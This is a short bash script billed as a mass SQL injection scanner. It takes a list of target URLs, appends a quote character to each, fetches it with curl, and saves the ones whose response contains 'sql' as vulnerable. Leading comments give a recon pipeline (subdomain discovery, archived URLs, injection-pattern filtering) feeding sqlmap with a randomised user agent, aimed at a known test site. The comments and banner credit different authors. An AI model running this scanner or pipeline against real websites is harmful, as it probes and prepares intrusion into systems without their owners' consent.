# findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; 
# sqlmap -m sqli --batch --random-agent --level 1

#!/bin/bash
	# I built this tool because bored with the LockDown
	# Ratnadip Gajbhiye

	echo `clear`;
	echo -e "\033[0m"
	printf "  +=============================================+"'\n'
	printf "  |      Mass Vuln Web SQL Injection Scanner    |"'\n'
	printf "  |                               by - sivakumar|"'\n'
	printf "  +=============================================+"'\n''\n'


	function check {
		b="Using : -w [Your Mass Target]\nExample : basename -w target.txt\n  
	"
	echo -e $b
	exit 1
	}
	[ "$1" ] || check;


	while getopts w: OPT ; 
	do
		#statements
		case "$OPT" in
			"w") masstarget="${OPTARG}" ;;
		esac
	done


	[ $masstarget ] || check;

	printf '\n'"[*] Scanning target file => $masstarget"'\n''\n'

	for vuln in `cat $masstarget`
	 do
	 	echo -e "\033[1;34m[*]\033[0m Scanning => $vuln"
	 	page=$(curl -s $vuln"'")

		if [[ $page =~ "sql" ]]; then
			echo -e "\e[31m[+] $vuln => Vulnerable SQl Injection\n"
			echo $vuln >> vuln.txt
		else
			echo -e "\e[32m[-] $vuln => Not Vulnerable"
			echo -e "\033[0m"
		fi
	done
	echo -e "\033[1;34m[!]Vulnerable Web Urls Saved in vuln.txt\n"
	echo -e "\033[0m"